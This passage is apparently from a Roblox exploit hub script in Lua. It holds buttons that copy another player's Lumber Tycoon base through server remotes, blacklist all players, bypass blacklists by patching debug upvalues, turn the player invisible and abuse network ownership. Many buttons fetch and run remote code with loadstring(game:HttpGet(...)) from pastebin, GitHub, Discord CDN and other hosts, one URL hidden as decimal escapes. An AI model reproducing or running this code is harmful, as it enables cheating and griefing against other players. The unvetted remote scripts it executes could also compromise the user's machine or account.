    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 40))
    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 80))
    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 80))
 
end)

--Wipe Base

WipeBase.MouseButton1Click:Connect(function()
		local plr = game.Players.LocalPlayer
	local torso = plr.Character.HumanoidRootPart
	
	local delaybeweenchecks = 0.5
	local opendistance = 10
	
	for i, v in pairs(game:GetService("Workspace").Stores.ShopItems:GetChildren()) do
	local A_1 = v
	local Event = game:GetService("ReplicatedStorage").Interaction.ClientIsDragging
	Event:FireServer(A_1)
	end
end)

--Copy Base

local script = Instance.new('LocalScript', CopyBase)

	script.Parent.MouseButton1Click:Connect(function()
		local RunService = game:GetService("RunService")
	local TargetPlayer = script.Parent.Parent.PlayerName.Text
	local SlowMode = true
	local WipeLocal = false
	 
	local CopyStructure = true
	local CopyWire = true
	local CopyItems = true
	local CopyFurniture = true
	 
	if WipeLocal then
	for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
	if v:FindFirstChild("Owner") then
	if v.Owner.Value == game.Players.LocalPlayer then
	game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(v)
	end
	end
	end
	wait(0.5)
	end
	 
	for i,v in pairs(game.Players:GetChildren()) do
	if v ~= game.Players.LocalPlayer then
	if v.Name:find(TargetPlayer) then
	TargetPlayer = v
	break
	end
	end
	end
	 
	local LocalLand, TargetLand
	 
	for i,v in pairs(game.Workspace.Properties:GetChildren()) do
	if v:FindFirstChild("Owner") then
	if v.Owner.Value == TargetPlayer then
	TargetLand = v
	elseif v.Owner.Value == game.Players.LocalPlayer then
	LocalLand = v
	end
	end
	end
	 
	local CollectedTargetStructures, CollectedLocalStructures, CollectedLocalFurnitures, CollectedTargetFurnitures, CollectedLocalItems, CollectedTargetItems  = {}, {}, {}, {}, {}, {}
	local CollectedTargetItemsCopy, CollectedTargetFurnituresCopy = {}, {}
	local TotalCollectedBlueprints = 0
	 
	if CopyStructure then
	for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
	if v:FindFirstChild("Owner") and v.Owner.Value == TargetPlayer then
	if v:FindFirstChild("BuildDependentWood") and (v.Type.Value == "Structure" or v.Type.Value == "Furniture") then
	local Data = {}
	Data.WoodClass = v:FindFirstChild("BlueprintWoodClass") and v.BlueprintWoodClass.Value
	Data.OffSet = (v:FindFirstChild("MainCFrame") and v.MainCFrame.Value or v.PrimaryPart.CFrame) - TargetLand.OriginSquare.Position
	Data.BlueprintType = v.ItemName.Value
	table.insert(CollectedTargetStructures,Data)
	end
	end
	end
	 
	for i, Data in pairs(CollectedTargetStructures) do
	game.ReplicatedStorage.PlaceStructure.ClientPlacedBlueprint:FireServer(Data.BlueprintType, LocalLand.OriginSquare.CFrame - Vector3.new(0,20,0), game.Players.LocalPlayer)
	 
	if SlowMode and (math.random(1,2) ~= 1) then
	RunService.RenderStepped:Wait()
	end
	end
	end
	 
	function blueprintHasBeenCollected(Model)
	if CollectedLocalStructures[Model.Name] then
	for i, BlueprintModel in pairs(CollectedLocalStructures[Model.Name]) do
	if BlueprintModel == Model then
	return true
	end
	end
	end
	return false
	end
	 
	repeat
	for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
	if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer and v:FindFirstChild("Type") and v.Type.Value == "Blueprint" and not blueprintHasBeenCollected(v) then
	if not CollectedLocalStructures[v.Name] then
	CollectedLocalStructures[v.Name] = {}
	end
	table.insert(CollectedLocalStructures[v.Name], v)
	TotalCollectedBlueprints = TotalCollectedBlueprints + 1
	end
	end
	wait()
	until TotalCollectedBlueprints == #CollectedTargetStructures
	 
	function SpawnStructure(Data, Blueprint)
	local Position = Data.OffSet + LocalLand.OriginSquare.Position
	game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(Blueprint.ItemName.Value, Position, game.Players.LocalPlayer, Data.WoodClass, Blueprint, not Data.WoodClass)
	end
	 
	for i, Data in pairs(CollectedTargetStructures) do
	local Blueprint = CollectedLocalStructures[Data.BlueprintType][1]
	table.remove(CollectedLocalStructures[Data.BlueprintType], 1)
	 
	SpawnStructure(Data, Blueprint)
	 
	if SlowMode and (math.random(1,2) ~= 1) then
	RunService.RenderStepped:Wait()
	end
	end
	 
	function CreateWire(WireType, Points)
	local Wire = game.ReplicatedStorage.Purchasables.WireObjects[WireType]
	 
	for i,v in pairs(Points) do
	Points[i] = v + LocalLand.OriginSquare.Position
	end
	 
	game.ReplicatedStorage.PlaceStructure.ClientPlacedWire:FireServer(Wire, Points)
	end
	 
	if CopyWire then
	for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
	if v:FindFirstChild("Owner") and v.Owner.Value == TargetPlayer and v:FindFirstChild("Type") and v.Type.Value == "Wire" and v:FindFirstChild("End1") then
	local Points = {}
	local PointCount = 1
	 
	table.insert(Points, (v.End1.Position - TargetLand.OriginSquare.Position))
	 
	for i,w in pairs(v:GetChildren()) do
	if w.Name:find("Point") then
	PointCount = PointCount + 1
	end
	end
	 
	for i=2, PointCount do
	local Point = v:FindFirstChild("Point"..tostring(i))
	table.insert(Points, (Point.Position - TargetLand.OriginSquare.Position))
	end
	 
	table.insert(Points, (v.End2.Position - TargetLand.OriginSquare.Position))
	CreateWire(v.ItemName.Value, Points)
	 
	if SlowMode and (math.random(1,2) ~= 1)then
	RunService.RenderStepped:Wait()
	end
	end
	end
	end
	 
	function isValidFurniture(Model)
	if Model:FindFirstChild("Type") and (Model.Type.Value == "Structure" or Model.Type.Value == "Furniture" or Model.Type.Value == "Vehicle Spot") then
	if Model:FindFirstChild("BuildDependentWood") or Model:FindFirstChild("PurchasedBoxItemName") then
	return false
	end
	return true
	end
	return false
	end
	 
	function Spawn(ItemName, Position)
	   local Info = {}
	   Info.Name = ItemName.Value
	   Info.Type = ItemName.Name == "PurchasedBoxItemName" and ItemName or game.ReplicatedStorage.Purchasables.Structures.HardStructures.Sawmill2.Type
	   Info.OtherInfo = game.ReplicatedStorage.Purchasables.WireObjects.Wire.OtherInfo
	   local Points = {Position.p, Position.p}
	   game.ReplicatedStorage.PlaceStructure.ClientPlacedWire:FireServer(Info, Points)
	end
	 
	if CopyFurniture then
	for i, Model in pairs(game.Workspace.PlayerModels:GetChildren()) do
	if Model:FindFirstChild("Owner") and Model.Owner.Value == TargetPlayer and isValidFurniture(Model) then
	local ItemName = Model:FindFirstChild("ItemName") or Model:FindFirstChild("PurchasedBoxItemName")
	local Position = (Model:FindFirstChild("MainCFrame") and Model.MainCFrame.Value or Model.PrimaryPart.CFrame) - TargetLand.OriginSquare.Position
	 
	if ItemName.Name == "PurchasedBoxItemName" then
	Spawn(ItemName, Position + LocalLand.OriginSquare.Position)
	else
	Spawn(ItemName, LocalLand.OriginSquare.CFrame - Vector3.new(0,20,0))
	end
	 
	local Data = {}
	Data.ItemName = ItemName.Value
	Data.OffSet = Position
	 
	table.insert(CollectedTargetFurnitures, Data)
	 
	if SlowMode and (math.random(1,2) ~= 1)then
	RunService.RenderStepped:Wait()
	end
	end
	end
	end
	 
	for i, v in pairs(CollectedTargetFurnitures) do
	table.insert(CollectedTargetFurnituresCopy,v)
	end
	 
	function isValidFurnitureModel(Model)
	for i, Data in pairs(CollectedTargetFurnitures) do
	if Data.ItemName == Model.ItemName.Value then
	table.remove(CollectedTargetFurnitures, i)
	return true
	end
	end
	return false
	end
	 
	repeat
	for i, Model in pairs(game.Workspace.PlayerModels:GetChildren()) do
	if Model.Name == "Wire" and Model:FindFirstChild("Owner") and Model.Owner.Value == game.Players.LocalPlayer and Model.ItemName.Value ~= "Wire" and isValidFurnitureModel(Model) then
	table.insert(CollectedLocalFurnitures, Model)
	end
	end
	wait()
	until #CollectedTargetFurnitures == 0
	 
	function GrabModelFromCollectedFurnitures(ItemName)
	for i, Model in pairs(CollectedLocalFurnitures) do
	if Model.ItemName.Value == ItemName then
	table.remove(CollectedLocalFurnitures,i)
	return Model
	end
	end
	end
	 
	for i, Data in pairs(CollectedTargetFurnituresCopy) do
	local Model = GrabModelFromCollectedFurnitures(Data.ItemName)
	local ItemName = Data.ItemName
	local Position = Data.OffSet + LocalLand.OriginSquare.Position
	game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(ItemName,Position,game.Players.LocalPlayer,false,Model,true)
	 
	if SlowMode and (math.random(1,2) ~= 1)then
	RunService.RenderStepped:Wait()
	end
	end
	 
	function isValidItem(Model)
	if Model:FindFirstChild("Type") and (Model.Type.Value == "Structure" or Model.Type.Value == "Loose Item" or Model.Type.Value == "Tool" or Model.Type.Value == "Wire" or Model.Type.Value == "Furniture" or Model.Type.Value == "Gift") then
	if (Model.Type.Value == "Structure" or Model.Type.Value == "Wire" or Model.Type.Value == "Furniture") and not Model:FindFirstChild("PurchasedBoxItemName") then
	return false
	end
	 
	return true
	elseif not Model:FindFirstChild("Type") then
	if Model:FindFirstChild("ItemName") then
	local ItemName = Model.ItemName.Value:lower()
	 
	if ItemName:find("bob") and (ItemName:find("wob") or ItemName:find("head"))then
	return true
	end
	end
	end
	return false
	end
	function itemIsOnLand(Position)
	if (math.abs(Position.X - TargetLand.OriginSquare.Position.X) > 101 or math.abs(Position.Z - TargetLand.OriginSquare.Position.Z) > 101) then
	return false
	end
	for i, Square in pairs(TargetLand:GetChildren()) do
	if Square.Name == "Square" then
	if (math.abs(Position.X - Square.Position.X) < 21 and math.abs(Position.Z - Square.Position.Z) < 21) then
	return true
	end
	end
	end
	return false
	end
	 
	if CopyItems then
	for i, Model in pairs(game.Workspace.PlayerModels:GetChildren()) do
	if Model:FindFirstChild("Owner") and Model.Owner.Value == TargetPlayer and isValidItem(Model) then
	local ItemName = Model:FindFirstChild("ItemName") or Model:FindFirstChild("PurchasedBoxItemName")
	local Position = (Model:FindFirstChild("MainCFrame") and Model.MainCFrame.Value or Model.PrimaryPart.CFrame) - TargetLand.OriginSquare.Position
	 
	if itemIsOnLand((Model:FindFirstChild("MainCFrame") and Model.MainCFrame.Value or Model.PrimaryPart.CFrame).p) then
	Spawn(ItemName, LocalLand.OriginSquare.CFrame - Vector3.new(0,20,0))
	 
	local Data = {}
	Data.ItemName = ItemName.Value
	Data.OffSet = Position
	 
	table.insert(CollectedTargetItems, Data)
	 
	if SlowMode and (math.random(1,2) ~= 1)then
	RunService.RenderStepped:Wait()
	end
	end
	end
	end
	end
	 
	for i, v in pairs(CollectedTargetItems) do
	table.insert(CollectedTargetItemsCopy,v)
	end
	 
	function isValidItemModel(Model)
	for i, Data in pairs(CollectedTargetItems) do
	if Data.ItemName == Model.ItemName.Value then
	table.remove(CollectedTargetItems, i)
	return true
	end
	end
	return false
	end
	function itemHasBeenCollected(Model)
	for i, Data in pairs(CollectedLocalItems) do
	if Data.ItemName == Model.ItemName.Value then
	return true
	end
	end
	return false
	end
	 
	repeat
	for i, Model in pairs(game.Workspace.PlayerModels:GetChildren()) do
	if Model.Name == "Wire" and Model:FindFirstChild("Owner") and Model.Owner.Value == game.Players.LocalPlayer and (Model.ItemName.Value ~= "Wire" or (Model:FindFirstChild("ItemName") and Model.ItemName.Value == "Wire" and Model:FindFirstChild("PurchasedBoxItemName"))) and isValidItemModel(Model) and not itemHasBeenCollected(Model) then
	table.insert(CollectedLocalItems, Model)
	end
	end
	wait()
	until #CollectedTargetItems == 0
	 
	function GrabModelFromCollectedItems(ItemName)
	for i, Model in pairs(CollectedLocalItems) do
	if Model.ItemName.Value == ItemName then
	table.remove(CollectedLocalItems,i)
	return Model
	end
	end
	end
	 
	for i, Data in pairs(CollectedTargetItemsCopy) do
	local Model = GrabModelFromCollectedItems(Data.ItemName)
	local ItemName = Data.ItemName
	local Position = Data.OffSet + LocalLand.OriginSquare.Position
	 
	if Model:FindFirstChild("PurchasedBoxItemName") then
	game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(false, Position, false, false, Model)
	Model.Parent = nil
	else
	game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(ItemName,Position,game.Players.LocalPlayer,false,Model,true)
	end
	 
	if SlowMode and (math.random(1,2) ~= 1)then
	RunService.RenderStepped:Wait()
	end
	end
end)

--Blacklist All

BlackListAll.MouseButton1Click:Connect(function()
		Client = game.ReplicatedStorage.Interaction.ClientSetListPlayer
	players = game.Players
	for i, v in pairs(players:GetPlayers()) do
	    if v.Name ~= players.LocalPlayer.Name then
	        Client:InvokeServer(players.LocalPlayer.BlacklistFolder, v, true)
	    end
	end
	players.PlayerAdded:connect(function(plr)
	    Client:InvokeServer(players.LocalPlayer.BlacklistFolder, plr, true)
	end)
	end)

--Anti Blacklist All

AntiBLAll.MouseButton1Click:Connect(function()
	local plr = game.Players.LocalPlayer
	    local cframe
	    for i,v in next, workspace:GetDescendants() do
	        if v:IsA("SpawnLocation") then
	            v.Touched:Connect(function(h)
	            if h.Parent == plr.Character and cframe then
	                plr.Character:SetPrimaryPartCFrame(cframe)
	                end
	            end)
	        end
	    end
	 
	    game:GetService("RunService"):BindToRenderStep("NO HACKS",Enum.RenderPriority.Last.Value,function()
	    if game.Players.LocalPlayer.Character.PrimaryPart then
	        cframe = game.Players.LocalPlayer.Character.PrimaryPart.CFrame
	        end
	    end)
	 
	    for i,v in next, debug.getregistry() do
	        if type(v)=='function' and debug.getupvalues(v).lastUpdate then
	            debug.setupvalue(v,"lastUpdate",math.huge)
	            break
	        end
	    end
	 
	    for i,v in next, workspace.Effects:GetChildren() do
	        if v:IsA("BasePart") and v.Name == "BlacklistWall" then
	            v:Destroy()
	        end
	    end
	end)

--Blood

Blood.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/jJ48V2yi", true))()
end)

--Venyx

Venyx.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/guLbXvSu", true))()
end)

--Light Lumber

LightLumber.MouseButton1Click:Connect(function()
	loadstring(game:GetObjects("rbxassetid://03271460677")[1].Source)()
end)

--Ferry

Ferry.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/WfpzEV2d", true))()
end)

--Bring Up

BringUp.MouseButton1Click:Connect(function()
	loadstring(game:GetObjects("rbxassetid://01925396229")[1].Source)()
end)

--Johiro Axe Dupe

JohiroAxeDupe.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/fmEYwvqn", true))()
end)()
end)
Section:NewButton("New Shrek in the backrooms script", "ButtonInfo", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/v3rmies/Roblox-Stuff/main/ShrekIntheBackrooms.lua')))()
end)
Section:NewButton("Raise A Floppa Script", "the flop dont stop", function()
    loadstring(game:HttpGet("https://cheeseskid.tk/shit/theflopdontstop.lua",true))()
end)
Section:NewButton("IV Admin commands type .cmds", "IV admin commands fe", function()
    -- // Iv- Admin
 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\79\109\110\105\112\111\116\101\110\99\101\68\101\118\101\108\111\112\101\114\47\78\117\109\98\101\114\47\109\97\105\110\47\49\46\108\117\97"))()
end)
Section:NewButton("NoCom Executor Credits yellowgregprogram", "subscribe to yellowgregprogram", function()
    --Made By YellowGreg ok--

loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/NoCom-Executor/main/NoCom"))()
end)
LocalSection:NewButton("Move Your Body tools ", "Move your Body", function()
    --[[

	MOVE ARMS (& LEGS)
	
	 version 1.5.3
	 
	 CHANGELOG
	 
	 30/10/2020:
	+ This scrip had filtering enabled (i had typo lol)
	 21/9/2020:
	+ mouse.UnitRay.Direction has been changed to mouse.Hit.lookVector from better sensibility.
	+ Changed 30% of better sensibility.
	 
	 20/9/2020:
	+ Fixed an bug when you're reseting your legs.
	
	 17/9/2020:
	+ Added moving legs.
	 
	 13/9/2020:
	+ Added teleport tool.
	 
	 12/9/2020:
	+ mouse.Hit.lookVector has been changed to mouse.UnitRay.Direction
	+ Now you can only move the head from 420º (degrees).
	+ Repositioned moving arms when reset tool is equipped.
	 
	 10/9/2020:
	+ Added moving head from special hits!
	+ Better sensibility with math.rad()
	- Removed debris service, sorry...
	 
	 09/9/2020:	 
	+ Repositioned moving arms and reset arms.

	 07/9/2020:
	+ Added reset tool from the special day!
	+ New version update!

	 04/9/2020: 
	+ Revamped Move Arms from a special hits!
	+ Better Sensibility is now improved!
	+ Positioned arms and smoothly moving arms.
	 
	 02/9/2020:
	+ SENSIBILITY UPDATE / SETTINGS UPDATE
	 
	 01/9/2020: 
	+ Initial paste release
]]

--FE Script
	local NetworkAccess = coroutine.create(function()
		settings().Physics.AllowSleep = false
		while true do
			game:GetService('RunService').RenderStepped:Wait()
			for _, players in pairs(game.Players:GetChildren()) do
				if players ~= game.Players.LocalPlayer then
					players.MaximumSimulationRadius = 0.1
					players.SimulationRadius = 0
				end
			end
			plr.MaximumSimulationRadius = math.pow(math.huge, math.huge)
			plr.SimulationRadius = math.huge * math.huge
		end
	end)
	coroutine.resume(NetworkAccess)

-- SETTINGS

local ToolDroppable = false

local toolName = { -- Customize the tool name later...

	["LeftArm"] = "Left Arm",
	["RightArm"] = "Right Arm",
	["Head"] = "Head",
	["LeftLeg"] = "Left Leg",
	["RightLeg"] = "Right Leg",
	["Teleport"] = "Teleporter",

}

local toolTip = { -- Customize the tool tip later...

	["LeftArm"] = "Moves your left arm freely",
	["RightArm"] = "Moves your right arm freely",
	["LeftLeg"] = "Moves your left leg freely",
	["RightLeg"] = "Moves your right leg freely",
	["Head"] = "Moves your head freely",
	["Teleport"] = "Teleports you by clicking on the mouse",

}

local Texture = { -- Customize the texture later...

	["LeftArm"] = "rbxassetid://415644845",
	["RightArm"] = "rbxassetid://634495580",
	["LeftLeg"] = "rbxassetid://25277847",
	["RightLeg"] = "rbxassetid://25277893",
	["Head"] = "rbxassetid://9573272",
	["Teleport"] = "rbxassetid://4799887091",

}

--SERVICES

local playerService = game:GetService("Players")

--LOCALS

local player = playerService.LocalPlayer
local character = player.Character
local mouse = player:GetMouse()

local canBeUsed = 0

--BODY PARTS

local BodyParts = {

	["LeftArm"] = character["Left Arm"],
	["RightArm"] = character["Right Arm"],
	["Torso"] = character["Torso"],
	["HumanoidRootPart"] = character.HumanoidRootPart,

}

local Motor6D = {

	["LeftShoulder"] = character.Torso["Left Shoulder"],
	["Neck"] = character.Torso.Neck,
	["RightShoulder"] = character.Torso["Right Shoulder"],
	["LeftHip"] = character.Torso["Left Hip"],
	["RightHip"] = character.Torso["Right Hip"],

}

--INSTANCES

local LArm = Instance.new("Tool", player.Backpack)
LArm.Name = toolName.LeftArm
LArm.ToolTip = toolTip.LeftArm
LArm.RequiresHandle = false
LArm.TextureId = Texture.LeftArm

local LLeg = Instance.new("Tool", player.Backpack)
LLeg.Name = toolName.LeftLeg
LLeg.ToolTip = toolTip.LeftLeg
LLeg.RequiresHandle = false
LLeg.TextureId = Texture.LeftLeg

local RLeg = Instance.new("Tool", player.Backpack)
RLeg.Name = toolName.RightLeg
RLeg.ToolTip = toolTip.RightLeg
RLeg.RequiresHandle = false
RLeg.TextureId = Texture.RightLeg

local RArm = Instance.new("Tool", player.Backpack)
RArm.Name = toolName.RightArm
RArm.ToolTip = toolTip.RightArm
RArm.RequiresHandle = false
RArm.TextureId = Texture.RightArm

local Neck = Instance.new("Tool", player.Backpack)
Neck.Name = toolName.Head
Neck.ToolTip = toolTip.Head
Neck.RequiresHandle = false
Neck.TextureId = Texture.Head

local teleTool = Instance.new("Tool", player.Backpack)
teleTool.Name = toolName.Teleport
teleTool.ToolTip = toolTip.Teleport
teleTool.TextureId = Texture.Teleport
teleTool.RequiresHandle = false

local resetTool = Instance.new("Tool", player.Backpack)
resetTool.Name = "Reset"
resetTool.ToolTip = "Resets your body when your arms had problems."
resetTool.RequiresHandle = false


--SETUP

if ToolDroppable then
	LArm.CanBeDropped = true
	RArm.CanBeDropped = true
else
	LArm.CanBeDropped = false
	RArm.CanBeDropped = false
end

LArm.Equipped:Connect(function()
	canBeUsed = 1
	while true do
		wait()
		if canBeUsed == 1 then
			Motor6D.LeftShoulder.C0 = CFrame.new(-2, 0.5, 0) * CFrame.Angles(mouse.Hit.lookVector.X + mouse.Origin.lookVector.X + math.rad(0), mouse.Hit.lookVector.Y + mouse.Origin.lookVector.Y + math.rad(90), mouse.Hit.lookVector.Z + mouse.Origin.lookVector.Z + math.rad(0))
		else
			break
		end
	end
end)

LLeg.Equipped:Connect(function()
	canBeUsed = 1
	while true do
		wait()
		if canBeUsed == 1 then
			Motor6D.LeftHip.C0 = CFrame.new(-0.03, -1, 0) * CFrame.Angles(mouse.Hit.lookVector.X + mouse.Origin.lookVector.X + math.rad(0), mouse.Hit.lookVector.Y + mouse.Origin.lookVector.Y + math.rad(90), mouse.Hit.lookVector.Z + mouse.Origin.lookVector.Z + math.rad(0))
		else
			break
		end
	end
end)

LArm.Unequipped:Connect(function()
	canBeUsed = 0
end)

LLeg.Unequipped:Connect(function()
	canBeUsed = 0
end)

RArm.Equipped:Connect(function()
	canBeUsed = 1
	while true do
		wait()
		if canBeUsed == 1 then
			Motor6D.RightShoulder.C0 = CFrame.new(2, 0.5, 0) * CFrame.Angles(mouse.Hit.lookVector.X + mouse.Origin.lookVector.X + math.rad(0), mouse.Hit.lookVector.Y + mouse.Origin.lookVector.Y + math.rad(90), mouse.Hit.lookVector.Z + mouse.Origin.lookVector.Z + math.rad(0))
		else
			break
		end
	end
end)

RLeg.Equipped:Connect(function()
	canBeUsed = 1
	while true do
		wait()
		if canBeUsed == 1 then
			Motor6D.RightHip.C0 = CFrame.new(0.03, -1, 0) * CFrame.Angles(mouse.Hit.lookVector.X + mouse.Origin.lookVector.X + math.rad(0), mouse.Hit.lookVector.Y + mouse.Origin.lookVector.Y + math.rad(-90), mouse.Hit.lookVector.Z + mouse.Origin.lookVector.Z + math.rad(0))
		else
			break
		end
	end
end)

RArm.Unequipped:Connect(function()
	canBeUsed = 0
end)

RLeg.Unequipped:Connect(function()
	canBeUsed = 0
end)

resetTool.Equipped:Connect(function()
	Motor6D.RightShoulder.C0 = CFrame.new(0.993, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(90), math.rad(0))
	Motor6D.LeftShoulder.C0 = CFrame.new(-0.993, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(-90), math.rad(0))
	Motor6D.Neck.C1 = CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(90), math.rad(180), math.rad(0))
	Motor6D.RightHip.C0 = CFrame.new(1, -1, 0) * CFrame.Angles(math.rad(0), math.rad(90), math.rad(0))
	Motor6D.LeftHip.C0 = CFrame.new(-1, -1, 0) * CFrame.Angles(math.rad(0), math.rad(-90), math.rad(0))
end)

Neck.Equipped:Connect(function()
	canBeUsed = 1
	while true do
		wait()
		if canBeUsed == 1 then
			Motor6D.Neck.C1 = CFrame.new(0, -0.5, 0) * CFrame.Angles(mouse.UnitRay.Direction.X + math.rad(90), mouse.UnitRay.Direction.Y + math.rad(180), mouse.UnitRay.Direction.Z + math.rad(420))
		else
			break
		end
	end
end)

Neck.Unequipped:Connect(function()
	canBeUsed = 0
end)

teleTool.Activated:Connect(function()
	character:MoveTo(Vector3.new(mouse.Hit.p.X, mouse.Hit.p.Y, mouse.Hit.p.Z))
end)

end)

LocalSection:NewButton("Invisible fe Press E to toggle", "invisible fe for troll", function()
     --[[Invisibility Toggle

You can find the orginal concept here: https://v3rmillion.net/showthread.php?tid=544634

This method clones the character locally, teleports the real character to a safe location, then sets the character to the clone.
Basically, your real character is in the sky while you are on the ground.


Because of the way this works, games with a decent anti-cheat will fuck this up.
If you turn it off, you have to go to a safe place before going invisible.

Written by: BitingTheDust ; https://v3rmillion.net/member.php?action=profile&uid=1628149
]]
--Settings:
local ScriptStarted = false
local Keybind = "E" --Set to whatever you want, has to be the name of a KeyCode Enum.
local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
local NoClip = false --Will make your fake character no clip.

local Player = game:GetService("Players").LocalPlayer
local RealCharacter = Player.Character or Player.CharacterAdded:Wait()

local IsInvisible = false

RealCharacter.Archivable = true
local FakeCharacter = RealCharacter:Clone()
local Part
Part = Instance.new("Part", workspace)
Part.Anchored = true
Part.Size = Vector3.new(200, 1, 200)
Part.CFrame = CFrame.new(0, -500, 0) --Set this to whatever you want, just far away from the map.
Part.CanCollide = true
FakeCharacter.Parent = workspace
FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

for i, v in pairs(RealCharacter:GetChildren()) do
  if v:IsA("LocalScript") then
      local clone = v:Clone()
      clone.Disabled = true
      clone.Parent = FakeCharacter
  end
end
if Transparency then
  for i, v in pairs(FakeCharacter:GetDescendants()) do
      if v:IsA("BasePart") then
          v.Transparency = 0.7
      end
  end
end
local CanInvis = true
function RealCharacterDied()
  CanInvis = false
  RealCharacter:Destroy()
  RealCharacter = Player.Character
  CanInvis = true
  isinvisible = false
  FakeCharacter:Destroy()
  workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid

  RealCharacter.Archivable = true
  FakeCharacter = RealCharacter:Clone()
  Part:Destroy()
  Part = Instance.new("Part", workspace)
  Part.Anchored = true
  Part.Size = Vector3.new(200, 1, 200)
  Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
  Part.CanCollide = true
  FakeCharacter.Parent = workspace
  FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

  for i, v in pairs(RealCharacter:GetChildren()) do
      if v:IsA("LocalScript") then
          local clone = v:Clone()
          clone.Disabled = true
          clone.Parent = FakeCharacter
      end
  end
  if Transparency then
      for i, v in pairs(FakeCharacter:GetDescendants()) do
          if v:IsA("BasePart") then
              v.Transparency = 0.7
          end
      end
  end
 RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
 Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
end
RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
local PseudoAnchor
game:GetService "RunService".RenderStepped:Connect(
  function()
      if PseudoAnchor ~= nil then
          PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
      end
       if NoClip then
      FakeCharacter.Humanoid:ChangeState(11)
       end
  end
)

PseudoAnchor = FakeCharacter.HumanoidRootPart
local function Invisible()
  if IsInvisible == false then
      local StoredCF = RealCharacter.HumanoidRootPart.CFrame
      RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = StoredCF
      RealCharacter.Humanoid:UnequipTools()
      Player.Character = FakeCharacter
      workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
      PseudoAnchor = RealCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = false
          end
      end

      IsInvisible = true
  else
      local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame
     
      RealCharacter.HumanoidRootPart.CFrame = StoredCF
     
      FakeCharacter.Humanoid:UnequipTools()
      Player.Character = RealCharacter
      workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
      PseudoAnchor = FakeCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = true
          end
      end
      IsInvisible = false
  end
end

game:GetService("UserInputService").InputBegan:Connect(
  function(key, gamep)
      if gamep then
          return
      end
      if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
          if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
              Invisible()
          end
      end
  end
)
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://232127604"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisible Toggle Loaded",["Text"] = "Press "..Keybind.." to become change visibility.",["Duration"] = 20,["Button1"] = "Okay."})
end)

Section:NewButton("Build A boat for treasure fe inf blocks", "YOU MUST NEED AT LEAST 100 GOLD TO WORK", function()
    _G.RUN = true
spawn(function()
coroutine.wrap(function()
while _G.RUN do wait()
coroutine.wrap(function()
while _G.RUN do wait()
workspace.ItemBoughtFromShop:InvokeServer("Winter Chest",math.floor(game:GetService("Players").LocalPlayer.Data.Gold.Value / 100))
end
end)()
end
end)()
end)
end)

Section:NewButton("Jnhh Gaming V8 Bedwars", "sub to jnhh", function()
    loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/988547966354735134/988916124802514964/out.lua",true))()
end)
Section:NewButton("Fe CHAOS Destroyer gui EXTREMELY OP", "press dupe in main for spams to work", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/1111-ssss/Chaos_Script/main/Chaos_script.txt'))()
    
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
    
